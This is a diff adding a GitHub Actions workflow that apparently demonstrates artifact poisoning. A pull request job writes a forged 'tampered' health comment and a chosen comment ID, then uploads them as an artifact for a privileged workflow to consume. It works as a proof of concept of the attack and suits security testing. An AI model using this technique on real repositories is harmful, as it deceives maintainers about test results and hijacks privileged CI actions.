@@ -1,0 +1,31 @@
+name: Health
+on:
+  pull_request:
+    branches: [ main ]
+
+permissions:
+  contents: read
+
+jobs:
+  fake-health:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Attacker-controlled payload
+        run: |
+          cat > comment.md <<'MD'
+          ### Health summary (tampered)
+
+          Coverage: 100% | Licenses: OK | Tests: all passing.
+
+          _This replacement text and the suppression of the original report were
+          supplied by an outside contributor._
+          MD
+          printf '6662835513\n' > commentId
+          ls -la comment.md commentId
+      - name: Upload artifact the privileged workflow consumes
+        uses: actions/upload-artifact@v4
+        with:
+          name: output
+          path: |
+            comment.md
+            commentId
